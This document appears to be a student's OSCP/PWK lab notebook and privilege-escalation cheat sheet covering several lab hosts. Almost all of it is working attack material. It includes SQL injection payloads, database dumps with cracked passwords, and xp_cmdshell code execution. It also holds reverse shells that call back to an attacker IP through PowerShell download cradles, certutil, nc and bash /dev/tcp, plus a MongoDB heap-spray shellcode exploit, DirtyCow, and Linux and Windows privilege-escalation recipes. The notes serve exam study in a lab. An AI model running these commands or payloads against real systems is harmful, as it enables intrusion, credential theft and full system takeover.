	5800/tcp  open  http-proxy         sslstrip
	5900/tcp  open  vnc                VNC (protocol 3.8)
	5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
gobuster dir -u http://10.11.1.128:4167/ -w /opt/directory-list-lowercase-2.3-medium.txt --timeout 100s -t 50 -b 404,400 -x .asp
http://10.11.1.128:4167/login.asp
	admin' or 1=1--
	#bypass login with sqli payload
http://10.11.1.128:4167/search.asp
	#artist parameter vulnerable to sqli
sqlmap -r req.txt --dbs --batch
	[*] master
	[*] model
	[*] msdb
	[*] music
	[*] tempdb
sqlmap -r req.txt -D music --dump-all --batch
	+----+-------+-----------------------------------------------+
	| id | name  | pass                                          |
	+----+-------+-----------------------------------------------+
	| 0  | alice | 5f4dcc3b5aa765d61d8327deb882cf99 (password)   |
	| 1  | brett | 34819d7beeabb9260a5c854bc85b3e44 (mypassword) |
	| 2  | peter | 7d9264f1c1c042b799ef08da95a782d4              |
	| 3  | eric  | 123pass123                                    |
	+----+-------+-----------------------------------------------+
crackmapexec smb 10.11.1.128 -u user.txt -p pass.txt
crackmapexec mssql 10.11.1.128 -u user.txt -p pass.txt
gobuster dir -u http://10.11.1.128:4167/ -w /opt/directory-list-lowercase-2.3-medium.txt --timeout 100s -t 50 -b 404,400 -x .asp
	/loginform.asp        (Status: 302) [Size: 130] [--> login.asp]
	#nothign usefull
sqlmap -r req.txt --os-cmd="powershell -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.119.135:445/rev.ps1')" --batch
rlwrap nc -lvp 21
>whoami
	nt authority\system
	#manual mssql injection
	#https://medium.com/@notsoshant/a-not-so-blind-rce-with-sql-injection-13838026331e
oasis'+order+by+2--
artist=oasis'UNION+ALL+SELECT+@@version,NULL--
	Microsoft SQL Server 2012 - 11.0.2100.60 (X64) Feb 10 2012 19:39:15 Copyright (c) Microsoft Corporation Express Edition (64-bit) on Windows NT 6.2 (Build 9200: ) (Hypervisor) 
artist=oasis'UNION+ALL+SELECT+user_name(),NULL--
	db0
	#check are user sysadmin database, which can execute command with xp_cmdshell
artist=a'UNION+ALL+SELECT+is_srvrolemember('sysadmin'),NULL--
	1
	#1 means yes, so I can execute command, first is enable it
artist=a'UNION ALL SELECT NULL,NULL;EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;--
	#mssql injection to RCE
artist=a'UNION ALL SELECT NULL,NULL; EXEC xp_cmdshell 'ping 192.168.119.135';--
sudo tcpdump -i tun0 icmp
	03:42:37.490636 IP 10.11.1.128 > 192.168.119.135: ICMP echo request, id 1, seq 21, length 40
	03:42:37.490674 IP 192.168.119.135 > 10.11.1.128: ICMP echo reply, id 1, seq 21, length 40
	#I got valid RCE, now to reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=21 -f exe -o rshell.exe
artist=a'UNION ALL SELECT NULL,NULL; EXEC xp_cmdshell 'certutil -urlcache -split -f http://192.168.119.135:445/rshell.exe C:\Windows\Temp\rshell.exe';--
artist=a'UNION ALL SELECT NULL,NULL; EXEC xp_cmdshell 'C:\Windows\Temp\rshell.exe';--
rlwrap nc -lvp 21
>whoami
	nt authority\system








10.11.1.237 Humble
========================================
sudo autorecon 10.11.1.237
sudo nmap -p- 10.11.1.237 --open -Pn -sV -oN fullnmap
cat fullnmap
	22/tcp    open  ssh       OpenSSH 6.0p1 Debian 4 (protocol 2.0)
	80/tcp    open  http      Apache httpd 2.2.22 ((Debian))
	111/tcp   open  rpcbind   2-4 (RPC #100000)
	443/tcp   open  ssl/https Apache/2.2.22 (Debian)
	44107/tcp open  status    1 (RPC #100024)
gobuster dir -u https://10.11.1.237/ -w /opt/directory-list-lowercase-2.3-medium.txt --timeout 100s -t 50 -b 404,400 -x .html -k
	/test.html            (Status: 200) [Size: 386]
	/web1                 (Status: 301) [Size: 311] [--> https://10.11.1.237/web1/]
https://10.11.1.237/test.html
	#query database that vulnerable to sqli
	#databse version shown using mongodb 2.2.3
https://10.11.1.237/cgi-bin/mongo/2.2.3/dbparse.py
	#https://www.exploit-db.com/exploits/24947
msfvenom -p linux/x86/shell_reverse_tcp LHOST=tun0 LPORT=80 -f js_le
	#remember to add space after escape injection asd';
asd'; shellcode=unescape("%udb31%ue3f7%u4353%u6a53%u8902%ub0e1%ucd66%u9380%ub059%ucd3f%u4980%uf979%uc068%u77a8%u68d1%u0002%u5000%ue189%u66b0%u5150%ub353%u8903%ucde1%u5280%u6e68%u732f%u6868%u2f2f%u6962%ue389%u5352%ue189%u0bb0%u80cd"); sizechunk=0x1000; chunk=""; for(i=0;i<sizechunk;i++){ chunk+=unescape("%u9090%u9090"); } chunk=chunk.substring(0,(sizechunk-shellcode.length)); testarray=new Array(); for(i=0;i<25000;i++){ testarray[i]=chunk+shellcode; } ropchain=unescape("%uf768%u0816%u0c0c%u0c0c%u0000%u0c0c%u1000%u0000%u0007%u0000%u0031%u0000%uffff%uffff%u0000%u0000"); sizechunk2=0x1000; chunk2=""; for(i=0;i<sizechunk2;i++){ chunk2+=unescape("%u5a70%u0805"); } chunk2=chunk2.substring(0,(sizechunk2-ropchain.length)); testarray2=new Array(); for(i=0;i<25000;i++){ testarray2[i]=chunk2+ropchain; } nativeHelper.apply({"x" : 0x836e204}, ["A"+"\x26\x18\x35\x08"+"MongoSploit!"+"\x58\x71\x45\x08"+"sthack is a nice place to be"+"\x6c\x5a\x05\x08"+"\x20\x20\x20\x20"+"\x58\x71\x45\x08"]);'
query=asd'; shellcode=unescape("%udb31%ue3f7%u4353%u6.......8\x71\x45\x08"]);'
nc -lvp 80
>whoami
	mongo
>uname -a
	Linux humble 3.2.0-4-486 #1 Debian 3.2.78-1 i686 GNU/Linux
	#vulnerable to dirtycow, vixed on 3.16.36-1+deb8u2
	#check detailed version on wikipedia, https://en.wikipedia.org/wiki/Dirty_COW
>gcc -pthread dc32.c -o 32dcow
	gcc: error trying to exec 'cc1': execvp: No such file or directory
>gcc -pthread 40839.c -o dcow -lcrypt
	gcc: error trying to exec 'cc1': execvp: No such file or directory
gcc -pthread 40839.c -o dcow -m32
>./dcow
	./dcow: /lib/i386-linux-gnu/i686/cmov/libcrypt.so.1: version `XCRYPT_2.0' not found (required by ./dcow)
	#error
gcc -pthread dc32.c -o dcow -m32
>chmod 777 dcow
>./dcow
#whoami
	root
	#the itented way
>whoami
	mogno
>ls /home
	davtest
>su davtest 
password: davtest
>whoami
	davtest
>cd ~
>find .
	./.davfs2/certs/private
	./.davfs2/cache
	./.davfs2/cache/127.0.0.1-webdav+home-davtest-dav+davtest
	./.davfs2/cache/127.0.0.1-webdav+home-davtest-dav+davtest/index
	./.davfs2/secrets
	./.davfs2/davfs2.conf
	#davfs2 1.4.6/1.4.7 - Local Privilege Escalation CVE-2013-4362 
searchsploit davfs
	davfs2 1.4.6/1.4.7 - Local Privilege Escalation			| linux/local/28806.txt
	#https://www.exploit-db.com/exploits/28806
	#set dav passwd for davtest in passwd.dav
>ls -la /var/www/web1/passwd.dav
	-rw-r----- 1 davtest www-data 89 Dec  5 11:58 /var/www/web1/passwd.dav
>htpasswd /var/www/web1/passwd.dav davtest
>grep davfs /etc/fstab
	http://127.0.0.1/webdav/   /home/davtest/dav   davfs   noauto,rw,users   0   0
>cd /home/davtest
>wget 192.168.119.209/28806.txt -O 28806.temp.txt
>tr -d '\r' < 28806.temp.txt > 28806.txt
>sed -n '40,73p' 28806.txt > coda.c
>sed -n '84,90p' 28806.txt > Makefile
>sed -n '101,192p' 28806.txt > exploit.sh
>echo '#!/usr/bin/env bash' > /home/davtest/rootprog
>echo 'bash -i >& /dev/tcp/192.168.119.209/22 0>&1' >> /home/davtest/rootprog
>cat rootprog
	#!/usr/bin/env bash
	bash -i >& /dev/tcp/192.168.119.209/22 0>&1
>chmod +x /home/davtest/rootprog
>chmod +x exploit.sh
>echo 'kernel_fs       coda' >> .davfs2/davfs2.conf
>cat  .davfs2/davfs2.conf
	...
	# debug           # possible values: config, kernel, cache, http, xml,
	kernel_fs       coda
nc -lnvp 22
./exploit.sh
	"Specify the full path of the kernel module" - enter
	"Specify the user-mode ELF which you whish to copy in /tmp/rootprog": /home/davtest/rootprog
>mount /home/davtest/dav
	Username: davtest
	Password: davtest
nc -lvp 22
>whoami
	root







10.11.1.73 PWK Gamma
========================================
sudo autorecon 10.11.1.73
sudo nmap -p- 10.11.1.73 --open -Pn -sV -oN fullnmap
cat fullnmap
	135/tcp   open  msrpc        Microsoft Windows RPC
	139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
	445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
	554/tcp   open  rtsp?
	1100/tcp  open  java-rmi     Java RMI
	2869/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	3306/tcp  open  mysql?
	5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	5800/tcp  open  vnc-http     TightVNC (user: gamma; VNC TCP port: 5900)
	5900/tcp  open  vnc          VNC (protocol 3.8)
	8014/tcp  open  http         Apache httpd
	8080/tcp  open  http         Apache httpd 2.4.9 ((Win32) PHP/5.5.12)
	10243/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
cat tcp_8080_http_dirb.txt
	==> DIRECTORY: http://10.11.1.73:8080/PHP/
http://10.11.1.73:8080/php/
	OVIDENTIA
	#couln't find the version and searchsploit has many exploit available
gobuster dir -u http://10.11.1.73:8080/php/ -w /opt/directory-list-lowercase-2.3-medium.txt --timeout 100s -t 50 -b 404,400 -x .php,.txt
	/upload               (Status: 301) [Size: 329] [--> http://10.11.1.73:8080/php/upload/]
	/skins                (Status: 301) [Size: 328] [--> http://10.11.1.73:8080/php/skins/]
	/install              (Status: 301) [Size: 330] [--> http://10.11.1.73:8080/php/install/]
	/lang                 (Status: 301) [Size: 327] [--> http://10.11.1.73:8080/php/lang/]
http://10.11.1.73:8080/php/install/install.txt
	OVIDENTIA 6.x
	==============
	$babDBLogin = "ovuser"; /* MySql database login */
	$babDBPasswd = "securepass"; /* MySql database password */
	4babDBName ="ovidentia"; /* MySql database name */
	User    : admin@admin.bab
	Password: 012345678
	#login with default username password admin@admin.bab:012345678
	#version 6.x vulnerable to sqlinjection
	#https://www.exploit-db.com/exploits/6232
http://10.11.1.73:8080/php/index.php?tg=contact&idx=modify&item=-99999'+union+select+0,1,2,concat(0x6E69636B6E616D65,0x3A,nickname),concat(0x70617373776F7264,0x3A,password),5,6,7,8,9,10,11,12,13,14+from+bab_users/*
sqlmap -r req.txt --random-agent --risk 3 --level 5 --dbms=mysql -p id --dbs
	#ca dump database, but leads to nothing
	#actually I can upload webshell because I logged in as administrator
http://10.11.1.73:8080/php/index.php?tg=admfms
http://10.11.1.73:8080/php/index.php?babrw=root/DGAll/babUser/babUserSection/babUserFm
http://10.11.1.73:8080/php/index.php?tg=fileman&idx=list&id=1&gr=Y&path=myfolder
http://10.11.1.73:8080/php/index.php?tg=fileman&idx=displayAddFileForm&id=1&gr=Y&path=myfolder
	#trigger webshell
http://10.11.1.73:8080/php/myfolder/fileManager/collectives/DG0/myfolder/p0wny.php
>whoami
	gamma\jill
>whoami /priv
	Privilege Name                Description                               State
	============================= ========================================= ========
	SeImpersonatePrivilege        Impersonate a client after authentication Enabled
>systeminfo
	OS Name:                   Microsoft Windows 7 Professional
	OS Version:                6.1.7601 Service Pack 1 Build 7601
	System Type:               X86-based PC
	#privesc seimpersonate windows 7 x86 with custom CLSID
	#https://ohpe.it/juicy-potato/CLSID/Windows_7_Enterprise/
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=445 -f exe -o rshell.exe
>Juicy.Potato.x86.exe -t * -l 1337 -p rshell.exe -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
nc -lvp 445
>whoami
	nt authority\system
	#another privesc ms11-046, windows 7 Professional
wget https://github.com/am0nsec/exploit/raw/master/windows/privs/MS11-046/ms11-046.c
	#I use compiled version from Devel Hackthebox, Authby PG
cp ../devel/ex.exe .
>certutil -urlcache -split -f http://192.168.119.192:445/ex.exe
>whomai
	gamma\jill
>ex.exe
>whoami
	nt authority\system






10.11.1.14 PWK Gamma
========================================
sudo autorecon 10.11.1.14
sudo nmap -p- 10.11.1.14 --open -Pn -sV -oN fullnmap
cat fullnmap
	21/tcp  open  ftp     Microsoft ftpd
	80/tcp  open  http    Microsoft IIS httpd 5.1
	443/tcp open  https?
ftp -p 10.11.1.14
>cd wwwroot
	#has write access, upload asp reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=21 -f asp -o rev.asp
>put rev.asp
http://10.11.1.14/rev.asp
rlwrap nc -lvp 21
>whoami.exe
	BOB\IWAM_BOB
>accesschk.exe -uwcqv "bob" * /accepteula
	RW SSDPSRV
			SERVICE_ALL_ACCESS
	RW upnphost
			SERVICE_ALL_ACCESS
>accesschk.exe -ucqv SSDPSRV /accepteula
	SSDPSRV
	RW NT AUTHORITY\SYSTEM
			SERVICE_ALL_ACCESS
	RW BUILTIN\Administrators
			SERVICE_ALL_ACCESS
	RW NT AUTHORITY\Authenticated Users
			SERVICE_ALL_ACCESS
	RW BUILTIN\Power Users
			SERVICE_ALL_ACCESS
	RW NT AUTHORITY\LOCAL SERVICE
			SERVICE_ALL_ACCESS
>accesschk.exe -ucqv upnphost /accepteula
	upnphost
	#all RW same as SSDPSRV
>sc qc upnphost
	BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService
	DEPENDENCIES       : SSDPSRV
	SERVICE_START_NAME : NT AUTHORITY\LocalService
	#upnphost has dependency with SSDPSRV, so SSDPSRV must start first
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=21 -f exe -o rshell.exe
>sc config upnphost binpath= "C:\temp\rshell.exe"
>sc qc upnphost
	BINARY_PATH_NAME   : C:\temp\rshell.exe
>sc config upnphost obj= ".\LocalSystem" password= ""
	#don't have to set obj, in case there are error
>net start SSDPSRV
	System error 1058 has occurred.
	#there are error starting SSDPSRV
>sc config SSDPSRV start= auto
>net start SSDPSRV
>net start upnphost
rlwrap nc -lvp 21
>whoami.exe
	NT AUTHORITY\SYSTEM








10.11.1.31 PWK Ralph
========================================
sudo autorecon 10.11.1.31
sudo nmap -p- 10.11.1.31 --open -Pn -sV -oN fullnmap
cat fullnmap
	80/tcp    open  http          Microsoft IIS httpd 10.0
	135/tcp   open  msrpc         Microsoft Windows RPC
	139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
	445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
	1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000
	3389/tcp  open  ms-wbt-server Microsoft Terminal Services
	5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
cat smbmap-share-permissions.txt
	IPC$                                                    READ ONLY       Remote IPC
	wwwroot                                                 READ ONLY
smbclient \\\\10.11.1.31\\wwwroot -U anonymous
>prompt OFF
>recurse ON
>mget *
	#find password
grep -iR pass
grep -iR admin
grep -iR user
	login-off.asp.txt:cnn.open "PROVIDER=SQLOLEDB;DATA SOURCE=RALPH;User ID=sa;PWD=poiuytrewq;DATABASE=bankdb"
	#got mssql credentials
sqsh -S 10.11.1.31:1433 -U sa -P "poiuytrewq"
1>EXEC sp_configure 'show advanced option', '1';
1>RECONFIGURE WITH OVERRIDE;
1>EXEC sp_configure 'xp_cmdshell', 1;
1>RECONFIGURE;
1>EXEC sp_configure 'show advanced option';
1>go
	config_value: 1
1>EXEC master..xp_cmdshell 'whoami'
2>go
	nt authority\system
	#mssql rce exec reverse shell
>EXEC master..xp_cmdshell '\\192.168.119.209\asd\nc.exe -e cmd.exe 192.168.119.209 80'
>go
impacket-smbserver asd . -smb2support
rlwrap nc -lvp 80
>whoami
	nt authority\system
	#via RDP
>EXEC master..xp_cmdshell 'net user jembot Password123! /add';
>EXEC master..xp_cmdshell 'net localgroup administrators /add jembot';
>EXEC master..xp_cmdshell 'NET LOCALGROUP "Remote Desktop Users" jembot /ADD'
rdesktop 10.11.1.31 -u jembot -p Password123!
>whoami
	ralph\jembot












10.11.1.133 PWK Gh0st
========================================
sudo autorecon 10.11.1.133
sudo nmap -p- 10.11.1.133 --open -Pn -sV -oN fullnmap
cat fullnmap
	80/tcp open  http    Microsoft IIS 5.6
cat tcp_80_http_dirb.txt
	==> DIRECTORY: http://10.11.1.133:80/Sites/
	==> DIRECTORY: http://10.11.1.133:80/_vti_bin/
	==> DIRECTORY: http://10.11.1.133:80/_vti_cnf/
	==> DIRECTORY: http://10.11.1.133:80/_vti_pvt/
	==> DIRECTORY: http://10.11.1.133:80/_vti_txt/
	==> DIRECTORY: http://10.11.1.133:80/bak/
	+ http://10.11.1.133:80/cgi-bin/ (CODE:403|SIZE:99)
	+ http://10.11.1.133:80/check.php (CODE:200|SIZE:85849)
	+ http://10.11.1.133:80/error (CODE:200|SIZE:99)
	(Location: 'error.html')
	+ http://10.11.1.133:80/error.html (CODE:200|SIZE:99)
	==> DIRECTORY: http://10.11.1.133:80/iissamples/
	+ http://10.11.1.133:80/index (CODE:200|SIZE:619)
	(Location: 'index.asp')
	+ http://10.11.1.133:80/index.asp (CODE:200|SIZE:619)
	+ http://10.11.1.133:80/login (CODE:200|SIZE:37)
	(Location: 'login.asp')
	+ http://10.11.1.133:80/login.asp (CODE:200|SIZE:37)
	+ http://10.11.1.133:80/server-status (CODE:403|SIZE:99)
	==>DIRECTORY: http://10.11.1.133:80/test/
	+ http://10.11.1.133:80/test.asp (CODE:200|SIZE:106)
http://10.11.1.133/check.php
	DOCUMENT_ROOT		/var/www/html 
	Hostname:Port		gh0st.thinc.local:80
	User/Group			www-data(33)/33 
	#phpinfo, and it's actually linux server running IIS 
view-source:http://10.11.1.133/bak/
	<? header('Location: /test.asp');?>
view-source:http://10.11.1.133/test.asp
	<!--script src=hidd3n-script></script>-->
http://10.11.1.133/hidd3n-script
	var _0x5490=["\x6C\x65\x..........snip.......5491()+_0x5490[7]);
	#some javascript idk how to read that and decode
	#looking up walktrough found out redirect to this page
http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111/index.asp
	#try login by sqli and failed
POST /1f2e73705207bdd6467e109c1606ed29-21213/111111111/index.asp HTTP/1.1
slogin_POST_username=asd&slogin_POST_password=asd&slogin_POST_send=
	#google slogin exploit turn out using Simple Text-File Login script (SiTeFiLo) 1.0.6
	#https://www.exploit-db.com/exploits/7444
http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111/slogin_lib.inc.php?slogin_path=http://192.168.119.209/cmd.php
cp phprev.php cmd.phpfooter.inc.php
	#or I can use LFI to RCE
http://10.11.1.133/1f2......l/slogin_lib.inc.php?slogin_path=data:text/plain,<?php echo shell_exec("which wget")?>
http://10.11.1.133/1f2......l/slogin_lib.inc.php?slogin_path=data:text/plain,<?php echo shell_exec("which nc")?>
cat rev.sh                                                                                                                                                       1 ⨯
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.119.209 80 > /tmp/f
http://10.11.1.133/1f2......1/slogin_lib.inc.php?slogin_path=data:text/plain,<?php echo shell_exec("wget 192.168.119.209/rev.sh -O /tmp/rev.sh")?>
http://10.11.1.133/1f2......1/slogin_lib.inc.php?slogin_path=data:text/plain,<?php echo shell_exec("bash /tmp/rev.sh")?>
nc -lvp 21
>whoami
	www-data
>cd ~
>find . | grep .php
>find . | grep .txt
	./1f2e73705207bdd6467e109c1606ed29-21213/111111111/slog_users.txt
	#slog user password located in slog_users.txt
>cat slog_users.txt
	Kibosh:fbX8kAx3Y7ycgnm
>ls /home
	kibosh
>su kibosh
	Password:fbX8kAx3Y7ycgnm
>whoami
	kibosh
>sudo -l
	(ALL : ALL) ALL
>sudo su
>whoami
	root









OSCP Buffer Overflow Prep
=================================================================
https://infosecwriteups.com/tryhackme-oscp-buffer-overflow-prep-overflow-1-19e000482f27
	#FUZZING
CTRL+F2 (reload)
F9 (start/resume)
python fuzz.py
	[*] gagal/crash
	[*] msf-pattern_create -l 3000
	#OFSET
msf-pattern_create -l 3000
python offset.py
	[+] sending offset buffer
	[+] done, check EIP: msf-pattern_offset -q 0xEIP
msf-pattern_offset -q 0x6F43396E                                                                                                                               130 ⨯
	[*] Exact match at offset 1978
	#BADCHAR
python3 generate-badchar.py
	buf+EIP+badchar
python badchar.py
!mona bytearray -b \x00\x07\x2e\xa0
!mona compare -f bytearray.bin -a ESP
!mona compare -f C:\mona\oscp\bytearray.bin -a 0x6F43396E
	#BADCHAR FOUND, FIND ESP
!mona jmp -r esp -cpb "\x00\x07\x2e\xa0"
!mona jmp -r ESP -m "essfunc.dll"
!mona find -s "\xff\xe4" -m essfunc.dll
double click and return to main dashboard and should FFE4
	#SHELL
msfvenom -p windows/exec cmd=calc.exe -f c -b '\x00\x0a' exitfunc=thread
msfvenom -p windows/shell_reverse_tcp lhost=tun0 lport=1337 -b '\x00\x07\x2e\xa0' exitfunc=thread -f c -e x86/shikata_ga_nai
python shell.py
	#proof
EIP ovewrite
ESP overwrite
value FFE4 jmp esp
generate shell
obtained shell
whoami && type proof.txt && ipconfig









qweqwe========batas=bawah================


Linux Priviledge Escalation Course
====================================
https://github.com/lamontns/pentest/blob/master/privilege-escalation/linux-privilege-escalation.md
		##kernel expoit dirtycow CVE-2016-5195
wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
bash linux-exploit-suggester.sh
wget https://www.exploit-db.com/download/40839
gcc -pthread 40839.c -o dcow -lcrypt
./dcow asd
su firefart
mv /tmp/passwd.bak /etc/passwd

		##mysql privsec
bash lse
mysql -u root
>select load_file ("/etc/shadow");
>set @asd = LOAD_FILE("/etc/shadow");
>select @asd;
>select @asd into outfile "/tmp/shadow.bak";

		##mysql UDF raptor os command
mysql --version
https://www.exploit-db.com/exploits/1518
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
mysql -u root
>use mysql;
>create table foo(line blob);
>insert into foo values(load_file('/home/user/raptor_udf2.so'));
>select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
>create function do_system returns integer soname 'raptor_udf2.so';
>select * from mysql.func;
>select do_system("cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash");
>exit
/tmp/rootbash -p

		##get user hash mysql
strings /var/lib/mysql/mysql/user.MYD

		##root login ssh
grep PermitRootLogin /etc/ssh/sshd_config

		##apache2 sudo
sudo apache2 -f /etc/shadow

		##using LD_PRELOAD
https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/

		##LD_LIBRARY_PATH privsc
#include <stdio.h>
#include <stdlib.h>
static void hijack() __attribute__((constructor));
void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p"); }

which apache2
ldd /usr/sbin/apache2
gcc -o libcrypt.so.1 -shared -fPIC library_path.c
sudo LD_LIBRARY_PATH=. apache2

		##cronjob writable job
cat /etc/crontab
which scipt.sh
ls -l /home/user/script.sh		
		
		##cronjob writable directory
cat /etc/crontab
nano /home/user/script.sh
/home/user/rootbash -p

		##cronjob wildcard *
cat /etc/crontab
		* * * * * root /usr/local/bin/compress.sh
cat /usr/local/bin/conpress.sh
		cd /home/user; tar czf /tmp/backup.tar.gz *
touch ./--checkpoint=1
touch ./--checkpoint-action=exec=rshell.sh

		##SUID exim
./lse
exim --version
	exim 4.84
searchsploit exim 4.84
searchsploit exim 4.8
searchsploit -m 39535
bash 39545.sh
	/bin/sh^M: bad interpreter
sed -i -e "s/^M//" 39545.sh
bash 39545.sh		
		
		##Shared Object Injection
bash lse
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
	open("/home/user/.config/libcalc.so", rdonly)(No such file or directory)
ls -l /home/user/.config/
nano /home/user/.config/libcalc.c
	#include <stdio.h>
	#include <stdlib.h>
	static void hijack() __attribute__((constructor));
	void hijack() {
	setuid(0);
	system("/bin/bash -p"); }
gcc -shared -fPIC -o libcalc.so libcalc.c
/usr/local/bin/suid-so

		##PATH environment
/usr/local/bin/suid-env
	starting apache2
strings /usr/local/bin/suid-env
	service apache2 start
strace -v -f -e execve /usr/local/bin/suid-env 2>&1 | grep service
	service apache2 start
nano service.c
	int main() {setuid(0); system("/bin/bash -p"); }
gcc -o service service.c
PATH=.:$PATH
/usr/local/bin/suid-env

		##abuse shell bash < 4.2-048
/usr/local/sbin/suid-env2
	starting apache2
strings /usr/local/bin/suid-env2
	/usr/sbin/service apache2 start
strace -v -f -e execve /usr/local/bin/suid-env2 2>&1 | grep service
	/usr/sbin/service apache2 start
/bin/sh --version
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service

		##abuse bash SHELLOPTS PS4 xtrace bash < 4.4
/usr/local/sbin/suid-env2
strings /usr/local/bin/suid-env2
strace -v -f -e execve /usr/local/bin/suid-env2 2>&1 | grep service
/bin/sh --version
env -i SHELLOPTS=xtrace PS4='<test>' /usr/local/bin/suid-env
env -i SHELLOPTS=xtrace PS4='$(whoami)' /usr/local/bin/suid-env
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash;chmod +s /tmp/rootbash)' /usr/local/bin/suid-env
/tmp/rootbash -p

		##NFS nfs no_root_squash
cat /etc/exports
showmount -e 10.1.1.73
mkdir nfs
mount -o rw,vers=2 10.1.1.73:/tmp nfs/
cp rootbash nfs/rootbash
chmod +xs nfs/rootbash
ls -l /tmp
/tmp/rootbash -p

		##python input() priviledge escalation
		#https://intx0x80.blogspot.com/2017/05/python-input-vulnerability_25.html
help(input) equivalent to eval(raw_input(prompt))
cat evil.py
	e=input("enter something")
	print e
echo 1+2 | python evil.py
	enter something 3
echo '__import__("os").system("uname -a") ' | python evil.py
	Linux ubuntu .....
	enter something 0


		##apache rce and path traversal CVE-2021-41773 and CVE-2021-42013 – Apache HTTP 2.4.49-50
		#https://rabakuku.xyz/cve-2021-41773-apache-http-2-4-49-50-remote-code-execution/
		#https://rabakuku.xyz/apache-server-2-4-49-cve-2021-41773-exploit-path-traversal/
cat nmap
	80/tcp	open	http	Apache httpd 2.4.49
	80/tcp	open	http	Apache httpd 2.4.50

		##xamp LFI
../../../../../../../../xamp/security/debdav.htpasswd



Windows Priviledge Escalation Course
====================================
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.1.1.5 LPORT=5555 -f exe -o reverse.exe
curl 10.1.1.5/reverse.exe -o reverse.exe
.\reverse.exe
rlwarp nc -lvp 5555
powershell -exec bypass

	##Kernel Exploit Windows
systeminfo > systeminfo.txt
	Microsoft Windows 7 Professional
	6.1.701 Service Pack 1 Build 7601
python2.7 -m pip install xlrd==1.2.0
python windows-exploit-suggester.py -d 2020-12-18-mssb.xls -i systeminfo.txt
	windows 7 CVE-2018-8120 kernel exploit privsc
x64.exe whoami
.\x64.exe reverse.exe
	#kernel exploit cheatseet
	#https://kakyouim.hatenablog.com/entry/2020/05/27/010807

	##service SERVICE_CHANGE_CONFIG exploit
	##insecure service permission
.\winpeas.exe quite servicesinfo
curl 10.1.1.5/accesschk.exe -o accesschk.exe
.\accesschk.exe /accepteula -uwcqv user daclsvc
	SERVICE_CHANGE_CONFIG
	SERVICE_START
	SERVICE_STOP
	#check status service windows
sc query daclsvc
sc.exe qc daclsvc
sc.exe query daclsvc
sc.exe config daclsvc binpath= "C:\PrivEsc\reverse53.exe"
sc.exe qc daclsvc
nc -lvp 53
net start daclsvc

	##exploit unquoted path services
.\winpeas.exe quite servicesinfo
	Unquoted Path Service
	no quotes and space detected
.\accesschk.exe /accepteula -ucqv unquotedsvc
	SERVICE_START
	SERVICE_STOP
sc.exe qc daclsvc
.\accesschk.exe /accepteula -uwdq C:\
.\accesschk.exe /accepteula -uwdq "C:\Program Files\"
.\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service"
	RM BUILDIN\Users
.\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\Common Files"
copy reverse53.exe "C:\Program Files\Unquoted Path Service\Common.exe"
sc.exe query unquotedsvc
nc -lvp 53
net start unquotedsvc

	##exploit weak registry permission
.\winpeas.exe
	modify any service registry
Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
	RW NT AYTHORITY\INTERACTIVE
.\accesschk.exe /accepteula -ucqv user regsvc
	SERVICE_START
	SERVICE_STOP
reg query HKLM\SYSTEM\CurrentControlSet\Services\regsvc
	ImagePath REG_EXPAND_SZ "C:\Program Files\insecureregistryservice.exe
	ObjectName REG_SZ LocalSystem
reg add HKLM\SYSTEM\CurrentControlSet\Services\regsvc /v imagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse53.exe /f
nc -lvp 53
net start regsvc

	##insecure service excutable FILE_ALL_ACCESS
.\winpeas.exe
	filepremsvc(File Permissions Service)
.\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
	RW Everyone FILE_ALL_ACCESS
.\accesschk.exe /accepteula -uvqc filepermsvc
	SERVICE_START
	SERVICE_STOP
copy "C:\Program Files\..\filepermservice.exe" C:\Temp
copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\...\filepermservice.exe"
nc -lvp 53
